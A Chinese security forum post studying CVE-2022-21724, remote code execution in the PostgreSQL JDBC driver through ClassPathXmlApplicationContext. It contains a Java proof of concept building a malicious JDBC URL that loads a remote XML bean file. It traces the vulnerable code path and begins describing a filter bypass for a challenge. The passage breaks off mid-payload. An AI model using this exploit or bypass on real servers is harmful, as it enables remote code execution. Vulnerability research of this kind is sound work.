---
title: ClassPathXmlApplicationContext的不出网利用学习
url: https://forum.butian.net/share/4373
source: 奇安信攻防社区
date: 2025-06-07
fetch_date: 2025-10-06T22:47:47.611806
---

# ClassPathXmlApplicationContext的不出网利用学习

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### ClassPathXmlApplicationContext的不出网利用学习

trick来自于p神知识星球挑战

前言
==
trick来自于p神知识星球挑战，spel利用那块跟的不是很清晰，求放过Orz
CVE-2022-21724 PostgreSQL JDBC Driver RCE分析
===========================================
复现这个先看看postgresql jdbc driver rce这个洞，之前没跟过
影响范围：
&gt; 9.4.1208 &lt;=PgJDBC &lt;42.2.25
&gt;
&gt; 42.3.0 &lt;=PgJDBC &lt; 42.3.2
这里从先知找了个调用流程图还不错
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-0415baaab378e9c938967d8a93e2867238863885.png)
当jdbc可控时就会造成rce，直接用payload跟一遍流程
```java
package com.ar3h.postgresqljdbcattack.poc;
import java.sql.DriverManager;
public class payload {
public static void main(String[] args) throws Exception{
String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
String socketFactoryArg = "http://127.0.0.1:8888/poc.xml";
String dbUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+"&socketFactoryArg="+socketFactoryArg;
System.out.println(dbUrl);
DriverManager.getConnection(dbUrl);
}
}
```
触发连接那块就不跟了直接来到`getSocketFactory`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-4e04c2cbe1aa7d57971338352a83f11f626b8c18.png)
这里会从info中获取`socketFactory` 即我们传入的`org.springframework.context.support.ClassPathXmlApplicationContext`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-3acd057b3a4f258de0943a78198d2a9667f47283.png)
如果没获取到就会读默认值，然后到`instantiate`方法，这里首先会获取socketFactoryArg的值，即我们传入的xml链接
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2dec6ef60b771cb308d0b5871ae391500f08d15b.png)
```php
public static SocketFactory getSocketFactory(Properties info) throws PSQLException {
String socketFactoryClassName = PGProperty.SOCKET\_FACTORY.get(info);
if (socketFactoryClassName == null) {
return SocketFactory.getDefault();
} else {
try {
return (SocketFactory)ObjectFactory.instantiate(socketFactoryClassName, info, true, PGProperty.SOCKET\_FACTORY\_ARG.get(info));
} catch (Exception var3) {
Exception e = var3;
throw new PSQLException(GT.tr("The SocketFactory class provided {0} could not be instantiated.", new Object[]{socketFactoryClassName}), PSQLState.CONNECTION\_FAILURE, e);
}
}
}
```
然后来到`instantiate` 方法，即漏洞点，其中classname和stringarg是我们可控的
```php
public static Object instantiate(String classname, Properties info, boolean tryString, String stringarg) throws ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException {
Object[] args = new Object[]{info};
Constructor<?> ctor = null;
Class<?> cls = Class.forName(classname); //获取类
try {
ctor = cls.getConstructor(Properties.class);
//在上面获取的类中找Properties的构造方法，肯定是找不到的
} catch (NoSuchMethodException var9) {
}
if (tryString && ctor == null) {
//这里我们传入的类为ClassPathXmlApplicationContext肯定找不到
//tryString默认为true，那么就会进入这个if逻辑
try {
ctor = cls.getConstructor(String.class);
//这里从上面类中获取只有一个String参数的构造方法
args = new String[]{stringarg};
//然后将xml赋值给args
} catch (NoSuchMethodException var8) {
}
}
if (ctor == null) {
ctor = cls.getConstructor();
args = new Object[0];
}
return ctor.newInstance((Object[])args);
//反射调用上面获取到的构造方法
}
```
这里即一段反射调用，详细的解释放在上面的代码注释中了，那么最终就会调用到 `ClassPathXmlApplicationContext` 的构造函数
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2a4af0493f40ce39a533fa516c3d9920070efe85.png)
后续的就是漏洞利用分析了
\*\*ClassPathXmlApplicationContext出网利用分析\*\*
----------------------------------------
### 获取远程地址分析
上面的构造函数会来到下面这里
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-ece2a78f6eb7d4e9cb71cb33bf2ed4fd17ccf531.png)
这里对`configLocations` 进行赋值，即xml的远程url地址，然后调用到`refresh()` 方法，跟进看看
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2ec1eb040b0367dcf296e741cd7996d9d67cd259.png)
这里调用了`obtainFreshBeanFactory()` 其实就是通过它获取到远程地址的，跟进看看具体流程
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-f907726cef5b8cd71b3a3fb13ee51abd03f4ffd3.png)
调用了`refreshBeanFactory()` 继续跟进，这里面调用了`loadBeanDefinitions(beanFactory)` 继续跟进
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2ccfdcce493bcca96b97950b8d8911d8262c4570.png)
调用了`loadBeanDefinitions(beanDefinitionReader)` 最终在这个里面通过`getConfigLocations()` 方法获取到我们前面赋值的`configLocations` 即远程xml地址
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-285d194723d793c1d0b853f43e53fc1d425dd1b3.png)
那么获取到之后就是进行解析了即最后的漏洞触发
### \*\*漏洞触发跟踪\*\*
这里在获取到远程地址后继续往后跟，在`refresh()` 方法中调用`invokeBeanFactoryPostProcessors()` 跟进这个方法调用了`getBeanNamesForType`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-a1a9d0c59dcdf41ced8cb7ff7086e5a2e0a44a65.png)
跟进调用到`doGetBeanNamesForType`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-2d63063dad3f9c158b730834aedc3bab51cef629.png)
在`doGetBeanNamesForType` 获取到mbd的类为`java.lang.ProcessBuilder`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-93f690e78b9b826a1d136f93632b39a0ca9cfa28.png)
然后跟进`isFactoryBean` 调用了`predictBeanType`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-30798736d02831936f21a2ad20e6f434245e90fe.png)
跟进`predictBeanType`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-60de644ca10e71998abe0b8178922f1c9a9a6508.png)
通过调用`determineTargetType` 函数来预测bean类型，里面通过调用`getTargetType` 函数来确定目标类型，后续在完成`invokeBeanFactoryPostProcessors` 流程后来到`finishBeanFactoryInitialization` 完成表达式执行，来到`AbstractBeanFactory#resolveBeanClass()` 方法中调用了`doResolveBeanClass`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-4ecf36903f3d586bb663d7d391185b863a7cece3.png)
跟进`doResolveBeanClass` 方法，其中调用了`evaluateBeanDefinitionString` 继续跟进
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-f5f7d74a81e3f52c61a73650d921c15e160a591a.png)
此时`beanExpressionResolver` 为`StandardBeanExpressionResolver` 对象且调用了`evaluate` 跟进
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-df720bde382efe5c389c9432d50cbfeb69b38fab.png)
`expr` 获取到的值为`java.lang.ProcessBuilder` ，然后执行`getValue` 方法，参数为`StandardEvaluationContext`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-065196aa05f291f62e1bf40d24cf9d077cb7671a.png)
后续就是spel表达式执行的流程了，分析到这里已经很头大了。。。不继续了
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/05/attach-bfe86ffccf70586e1b15cbbbd9586b0db5378d6e.png)
\*\*ClassPathXmlApplicationContext不出网利用分析\*\*
-----------------------------------------
这里就直接用p神的挑战来分析了，不另外搭环境测了
### URL解析过程分析
首先有个Filter需要绕过
```php
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
String url = request.getParameter("url");
if (url != null) {
if (url.toLowerCase().contains("jdbc:postgresql") && url.toLowerCase().contains("socketFactory".toLowerCase())) {
response.setStatus(HttpServletResponse.SC\_FORBIDDEN);
response.getWriter().write("url is not security");
return;
}
}
filterChain.doFilter(request, response);
}
```
`jdbc:postgresql` 和`socketFactory` 不能同时出现，这里利用的是`getParameter` 方法和springboot在controller获取get参数的解析差异来绕过，`getParameter` 方法在有多个url参数时只获取第一个url
比如我们传入的url如下
```php
?url=jdbc:postgresql://127....